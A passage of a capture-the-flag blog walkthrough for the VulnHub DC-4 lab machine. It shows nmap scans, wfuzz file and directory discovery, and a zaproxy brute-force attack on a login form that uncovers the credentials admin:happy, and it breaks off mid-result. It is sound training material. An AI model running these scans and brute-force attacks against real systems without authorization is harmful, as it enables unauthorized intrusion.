/images/CTF/VulnHub/DC-Series/DC-4/var-assignments.png?size=large 2x" sizes=auto data-title="environment variable assignments" data-alt="environment variable assignments" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>environment variable assignments</figcaption></figure></p><hr><hr><h2 id=nmap-scans>Nmap Scans</h2><p>Now that we confirmed DC-4&rsquo;s IP, we can move to port and service scans using Nmap.</p><h3 id=nmap-all-port-scan>Nmap all port scan</h3><p>To discover which ports may be open, run an all port scan against the target.</p><p><code>nmap -p- -Pn &lt;DC-4 IP></code><br><code>-p-</code> - All 65,535 ports.<br><code>-Pn</code> - Scans hosts not responding to ping requests. Useful against Windows.</p><p>In this scan, two ports are showing open.</p><ul><li>Port 22 - Running a SSH service</li><li>Port 80 - Running a HTTP service</li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/nmap-all-port.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/nmap-all-port.png?size=small" data-sub-html="<h2>nmap - all port scan</h2><p>nmap - all port scan</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/nmap-all-port.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/nmap-all-port.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/nmap-all-port.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/nmap-all-port.png?size=large 2x" sizes=auto data-title="nmap - all port scan" data-alt="nmap - all port scan" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>nmap - all port scan</figcaption></figure></p><h3 id=nmap-service-scan>Nmap service scan</h3><p>Knowing which of the 65,535 ports are open can help focus the version/service scans and save lots of time.<br>Run a service and versioning scan against the ports we confirmed were open.</p><p><code>nmap -p 22,80 -sV -sC &lt;DC-4 IP></code><br><code>-p</code> - allows us to specify port ranges and/or individual ports.<br><code>-sV</code> - runs versioning checks on each service found.<br><code>-sC</code> - runs default scripts against each service found.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/nmap-service-version.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/nmap-service-version.png?size=small" data-sub-html="<h2>nmap - service/version scan</h2><p>nmap - service/version scan</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/nmap-service-version.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/nmap-service-version.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/nmap-service-version.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/nmap-service-version.png?size=large 2x" sizes=auto data-title="nmap - service/version scan" data-alt="nmap - service/version scan" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>nmap - service/version scan</figcaption></figure></p><p>nmap reports back the following:</p><ul><li>Port 22 - SSH - OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</li><li>Port 80 - HTTP - nginx 1.15.10</li></ul><p>Deciding which service to go after next all depends on what information you currently have.<br>Unless this particular OpenSSH version has an easy and quick exploit, SSH is less attractive as we currently lack usernames and/or passwords, so attacking HTTP should be our next target.</p><p>HTTP can provide us a way into the target, like a login panel. It can also leak sensitive data in an exposed directory and/or file.</p><br><p><strong>Hacker mindset</strong><br>With practice you&rsquo;ll develop your own way of thinking and everyone gets that &ldquo;ah ha&rdquo; moment at different times.</p><p>Anyways..<br>Upon further review of the nmap version and script results, a HTTP title was found with a label of &ldquo;System Tools&rdquo;. I&rsquo;m already thinking..</p><ul><li>Development panel with &ldquo;System Tools&rdquo;? Tools execute code. RCE? SSRF?</li><li>Do admins access this? I should look for login panels or sensitive data.</li></ul><p>Point is&mldr; At every step, make a simple list of possible attack vectors and keep those thoughts <u>SIMPLE</u>! It&rsquo;s <em>very</em> easy to find yourself in yet another rabbit hole, wasting precious time. To each their own, but when I find myself stuck or confused, I go do something else for a few minutes and come back to the problem. Most of the time, I&rsquo;ll see where I turned the wrong direction in my thoughts and then things will usually &lsquo;click&rsquo; for me.</p><hr><hr><h2 id=directory-and-file-scans>Directory and File scans</h2><p>Since the target has outbound ports exposed to us and one is a nginx webserver running on port 80, scanning for hidden files and directories is a must!<br>It could provide a better understanding of a possible attack path we could abuse and/or expose sensitive data from various files, e.g., administrator notes, cleartext passwords in a document, etc.</p><p>Where we currently stand in our attack against DC-4, information is key!</p><p>Remember I went ahead and exported both $URLfile and $URLdir environment variables.<br>These are the following:<br><code>$URLfile = http://192.168.0.128/FUZZ</code><br><code>$URLdir = http://192.168.0.128/FUZZ/</code></p><h3 id=wfuzz-against-files>wfuzz against files</h3><p><a href=https://wfuzz.readthedocs.io/en/latest/ target=_blank rel="external nofollow noopener noreferrer">wfuzz</a> is a fast, flexible fuzzing tool which I prefer over others as it can handle many different fuzzing attacks. But the fuzzer is only half the solution and you&rsquo;ll need a good wordlist.<br>For a solid wordlist resource, I recommend Daniel Miessler&rsquo;s <a href=https://github.com/danielmiessler/SecLists target=_blank rel="external nofollow noopener noreferrer">SecLists</a> repo. In the command below, you&rsquo;ll see which wordlist directory I like using for webapp file/directory fuzzing.<br>Anyways, back to it!</p><p>Run wfuzz against files in the root web directory.</p><p><code>wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt $URLfile</code><br><code>-c</code> - enables color output.<br><code>--hc 404</code> - hides any response codes of 404, aka page not found.<br><code>-w</code> - specify wordlist location.<br><code>$URLfile</code> - exported variable from before. <code>http://192.168.0.128/FUZZ</code>. The <code>FUZZ</code> keyword acts as the payload locator.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/wfuzz-file.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/wfuzz-file.png?size=small" data-sub-html="<h2>wfuzz - file scan</h2><p>wfuzz - file scan</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/wfuzz-file.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/wfuzz-file.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/wfuzz-file.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/wfuzz-file.png?size=large 2x" sizes=auto data-title="wfuzz - file scan" data-alt="wfuzz - file scan" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>wfuzz - file scan</figcaption></figure></p><p>Results from the root file fuzzing, which shows <strong>command.php</strong> but isn&rsquo;t accessible (302 redirect). This may provide us a way to interact with a service or script?<br>000000001: 200 23 L 40 W 506 Ch &ldquo;index.php&rdquo;<br>000000004: 302 15 L 17 W 206 Ch &ldquo;login.php&rdquo;<br>000000156: 302 9 L 13 W 163 Ch &ldquo;logout.php&rdquo;<br>000000379: 301 7 L 11 W 170 Ch &ldquo;.&rdquo;<br>000002602: 302 24 L 67 W 704 Ch &ldquo;command.php&rdquo;</p><br><h3 id=wfuzz-against-directories>wfuzz against directories</h3><p>Run wfuzz against directories in the root web directory.</p><p><code>wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt $URLdir</code><br><code>-c</code> - enables color output.<br><code>--hc 404</code> - hides any response codes of 404, aka page not found.<br><code>-w</code> - specify wordlist location.<br><code>$URLdir</code> - exported variable from before. <code>http://192.168.0.128/FUZZ</code>. The <code>FUZZ</code> keyword acts as the payload locator.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/wfuzz-directory.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/wfuzz-directory.png?size=small" data-sub-html="<h2>wfuzz - directory scan</h2><p>wfuzz - directory scan</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/wfuzz-directory.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/wfuzz-directory.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/wfuzz-directory.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/wfuzz-directory.png?size=large 2x" sizes=auto data-title="wfuzz - directory scan" data-alt="wfuzz - directory scan" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>wfuzz - directory scan</figcaption></figure></p><p>Directory results don&rsquo;t show anything interesting:<br>000000015: 403 7 L 9 W 154 Ch &ldquo;css&rdquo;<br>000000002: 403 7 L 9 W 154 Ch &ldquo;images&rdquo;</p><br><h3 id=reviewing-wfuzz-results>reviewing wfuzz results</h3><p><code>command.php</code> looks interesting BUT we can&rsquo;t access it as it redirects back to the /index.php page.<br>/login.php and /logout.php also redirect back to /index.php page.</p><p>A recursive fuzzing attack is possible, but we&rsquo;ll keep that for later. It&rsquo;s important to keep things simple and not to fall into rabbit holes!</p><p>I&rsquo;m going to move onto interacting with the web server using zaproxy. I may also search the HTTP header, &ldquo;System Tools&rdquo;, for common findings on google as it could relate to a specific kind of software.</p><hr><hr><h2 id=interacting-with-the-web-server>Interacting with the web server</h2><p>Searching &ldquo;System Tools&rdquo; resulted in nothing useful on Google.</p><p>At this point we could either spend time fuzzing more directories and files or we could check for abusable web server messages, login feedback, etc&mldr;<br>Let&rsquo;s go load up a proxy and check the HTTP messages!</p><h3 id=checking-out-the-login-panel>Checking out the login panel</h3><ol><li>Load up a web browser, with your favorite proxy, and launch <code>zaproxy</code>(or <code>burpsuite</code>, or whatever you&rsquo;d like).</li><li>Reviewing the /index.php response message shows us a login.php action with a post method, a username field, and a password field. A login panel!</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-index-response.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-index-response.png?size=small" data-sub-html="<h2>webserver - /index.php response</h2><p>webserver - /index.php response</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-index-response.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-index-response.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-index-response.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-index-response.png?size=large 2x" sizes=auto data-title="webserver - /index.php response" data-alt="webserver - /index.php response" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - /index.php response</figcaption></figure></p><ol start=3><li>Visiting the /index.php site, with our browser, shows the login panel we just found in the response message.</li><li>Might as well check for username or password enumeration!<br>Simply plug in some bogus data and hit submit. Then try again with &ldquo;admin&rdquo; and &ldquo;administrator&rdquo;. No feedback saying &ldquo;invalid username&rdquo; or &ldquo;wrong password&rdquo;, etc.<br>Well good for the developer for making it safe from enumeration attacks but that won&rsquo;t stop us!</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-panel-noFB.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-panel-noFB.png?size=small" data-sub-html="<h2>webserver - no login feedback</h2><p>webserver - no login feedback</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-panel-noFB.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/webserver-login-panel-noFB.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/webserver-login-panel-noFB.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/webserver-login-panel-noFB.png?size=large 2x" sizes=auto data-title="webserver - no login feedback" data-alt="webserver - no login feedback" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>webserver - no login feedback</figcaption></figure></p><p><strong>Hacker mindset</strong><br>We&rsquo;ve discovered a login panel that provides zero feedback upon failed login attempts and doesn&rsquo;t seem to care that we&rsquo;ve failed multiple login attempts.<br>I&rsquo;m thinking I&rsquo;ll try these next few steps:</p><ul><li>Searchsploit nginx and ssh versions for anything abusable. If nothing&mldr;</li><li>Attempt a brute-force attack hoping there&rsquo;s no lockout policy.</li></ul><hr><hr><h2 id=brute-forcing-loginphp>Brute-forcing /login.php</h2><p><code>searchsploit</code> came back with nothing useful on SSH 7.4p1 or nginx 1.15.10, so I&rsquo;m moving onto a brute-force attack using <code>zaproxy</code>.</p><p>So onto the setup&mldr;.</p><h3 id=setup-brute-force-attack-in-zaproxy>Setup brute-force attack in zaproxy</h3><p>I&rsquo;ll be doing a &ldquo;Cluster Bomb&rdquo; attack, per the cool terminology of <code>burpsuite</code>, but through zaproxy as it does NOT have a rate limiter.</p><p>This attack method iterates through a wordlist which assign to their own placeholder. zaproxy will try every possible combination between all wordlists, meaning the overall payload set can grow very large!<br>With that in mind, I&rsquo;ll be using smaller wordlists for both the username and password fields.</p><p>Open <code>zaproxy</code>, along with a proxy configured browser pointing at /index.php:</p><ol><li>Input whatever placeholders you&rsquo;d like into the username and password fields of the login panel.</li><li>Click &ldquo;login&rdquo; while intercepting the POST request.</li><li>Now open <code>zaproxy</code> to see a request message with your custom placeholders. In my example, username=FuzzUser and password=FuzzPassword.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-placeholders.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-placeholders.png?size=small" data-sub-html="<h2>zaproxy - placeholders</h2><p>zaproxy - placeholders</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-placeholders.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-placeholders.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-placeholders.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-placeholders.png?size=large 2x" sizes=auto data-title="zaproxy - placeholders" data-alt="zaproxy - placeholders" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - placeholders</figcaption></figure></p><ol start=4><li>Open the fuzzing tool by going to &ldquo;Tools&rdquo; > &ldquo;Fuzz&mldr;&rdquo;. A new window, labeled &ldquo;Select Message&rdquo;, will open.</li><li>Select the POST request message &ldquo;POST:login.php()(password,username)&rdquo; and click &ldquo;Select&rdquo;.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-select-message.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-select-message.png?size=small" data-sub-html="<h2>zaproxy - select correct message</h2><p>zaproxy - select correct message</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-select-message.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-select-message.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-select-message.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-select-message.png?size=large 2x" sizes=auto data-title="zaproxy - select correct message" data-alt="zaproxy - select correct message" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - select correct message</figcaption></figure></p><ol start=6><li>Now with the fuzzer tool opened, we want to add a wordlist to the first placeholder, which will apply to the username field. In my example, I&rsquo;ll highlight &ldquo;FuzzUser&rdquo; and then click &ldquo;Add&mldr;&rdquo;</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-highlight-username.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-highlight-username.png?size=small" data-sub-html="<h2>zaproxy - highlight username then add</h2><p>zaproxy - highlight username then add</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-highlight-username.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-highlight-username.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-highlight-username.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-highlight-username.png?size=large 2x" sizes=auto data-title="zaproxy - highlight username then add" data-alt="zaproxy - highlight username then add" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - highlight username then add</figcaption></figure></p><ol start=7><li>You&rsquo;ll see a new popup window labeled &ldquo;Payloads&rdquo;. Click &ldquo;Add&mldr;&rdquo; to open the &ldquo;Add Payload&rdquo; window.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-payload-window.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-payload-window.png?size=small" data-sub-html="<h2>zaproxy - open payload window</h2><p>zaproxy - open payload window</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-payload-window.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-payload-window.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-payload-window.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-payload-window.png?size=large 2x" sizes=auto data-title="zaproxy - open payload window" data-alt="zaproxy - open payload window" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - open payload window</figcaption></figure></p><ol start=8><li>You should now see a window labeled &ldquo;Add Payload&rdquo;. To add the wordlist to the payload:<br>a. Change the &ldquo;Type:&rdquo; from &ldquo;Strings&rdquo; to &ldquo;File&rdquo;.<br>b. Click &ldquo;Select&mldr;&rdquo;<br>c. Go find the payload you&rsquo;d like to add for the username field. I used the following, which is located in the SecLists repo:<br><code>/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt</code><br>d. Once that&rsquo;s loaded, you should see some of the desirable values in the &ldquo;Payloads Preview&rdquo; window. Next click &ldquo;Add&rdquo;.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-add-username-payload.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-add-username-payload.png?size=small" data-sub-html="<h2>zaproxy - add username payload</h2><p>zaproxy - add username payload</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-add-username-payload.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-add-username-payload.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-add-username-payload.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-add-username-payload.png?size=large 2x" sizes=auto data-title="zaproxy - add username payload" data-alt="zaproxy - add username payload" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - add username payload</figcaption></figure></p><ol start=9><li>You should now see the first payload added into the &ldquo;Payloads&rdquo; list. This still only relates to the username field, meaning you can add multiple payloads per field! That pretty cool. Anyways, to finalize the username payloads, click &ldquo;OK&rdquo;.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-finalize-username-payload.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-finalize-username-payload.png?size=small" data-sub-html="<h2>zaproxy - finalize username payload</h2><p>zaproxy - finalize username payload</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-finalize-username-payload.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-finalize-username-payload.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-finalize-username-payload.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-finalize-username-payload.png?size=large 2x" sizes=auto data-title="zaproxy - finalize username payload" data-alt="zaproxy - finalize username payload" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - finalize username payload</figcaption></figure></p><ol start=10><li><p>Now do the same exact steps for the password field.<br>For reference, I used the following wordlist, from the SecLists repo, for the password payload:<br><code>/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt</code></p></li><li><p>After adding both username and password payloads, land yourself back at the &ldquo;Fuzzer&rdquo; window. You should have two fields loaded with payloads.</p></li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-ready.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-ready.png?size=small" data-sub-html="<h2>zaproxy - fuzzer ready</h2><p>zaproxy - fuzzer ready</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-ready.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-ready.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-ready.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-ready.png?size=large 2x" sizes=auto data-title="zaproxy - fuzzer ready" data-alt="zaproxy - fuzzer ready" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - fuzzer ready</figcaption></figure></p><div class="details admonition warning open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-exclamation-triangle fa-fw" aria-hidden=true></i>Attack speed matters!<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>Be mindful of your attacks against login services! Being a CTF, it&rsquo;s okay to attack without limiters but in a real penetration test, attacking without limits will result in a very negative outcome for everyone involved.</div></div></div><ol start=12><li>Be mindful of your attack rates when brute-forcing login services. In zaproxy, you can change the attack rates from the &ldquo;Fuzzer&rdquo; window by clicking &ldquo;Options&rdquo; and then adjusting the &ldquo;Delay when Fuzzing&rdquo; and &ldquo;Concurrent Scanning Threads per Scan&rdquo; values. The screenshot lacks the values but I used 5000 Delay with 10 threads. Not sure how fast this attack can go without crashing a service, but this took about 15 minutes to finish since I had a total of 8500 requests to send.</li></ol><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-options.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-options.png?size=small" data-sub-html="<h2>zaproxy - fuzzer options</h2><p>zaproxy - fuzzer options</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-options.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-options.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-options.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-options.png?size=large 2x" sizes=auto data-title="zaproxy - fuzzer options" data-alt="zaproxy - fuzzer options" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - fuzzer options</figcaption></figure></p><ol start=13><li>With everything prepped, start the attack by clicking &ldquo;Start Fuzzer&rdquo;!<br>You&rsquo;ll see the Fuzzer tab appear at the bottom of zaproxy and many requests being sent to the webserver. Lets start analyzing the results!</li></ol><h3 id=analyzing-the-brute-force-results>Analyzing the brute-force results</h3><p>So&mldr; what to look for??</p><ol><li>A change from the 302 code.</li><li>The response message will and should change byte sizes, even if small.</li><li>Sometimes RTT can change value in milliseconds.</li></ol><p>With that in mind, lets click the &ldquo;Code&rdquo; column to organize the codes so that anything below 302 shows at the top.<br>Upon review, I found the response and code values changed around the username:password values of <code>admin:happy</code>.</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-1.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-1.png?size=small" data-sub-html="<h2>zaproxy - fuzzer 302-200 results</h2><p>zaproxy - fuzzer 302-200 results</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-1.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-1.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-1.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-1.png?size=large 2x" sizes=auto data-title="zaproxy - fuzzer 302-200 results" data-alt="zaproxy - fuzzer 302-200 results" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>zaproxy - fuzzer 302-200 results</figcaption></figure></p><p>When looking at my 914th task, I found that <code>admin:happy</code> resulted in code &ldquo;302 Found&rdquo; BUT the response message showed a &ldquo;You are currently logged in&rdquo; value!! Success!</p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-reponse.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-reponse.png?size=small" data-sub-html="<h2>zaproxy - fuzzer message results in success!</h2><p>zaproxy - fuzzer message results in success!</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-reponse.png srcset="/images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-reponse.png?size=small, /images/CTF/VulnHub/DC-Series/DC-4/zaproxy-fuzzer-results-reponse.png?size=medium 1.5x, 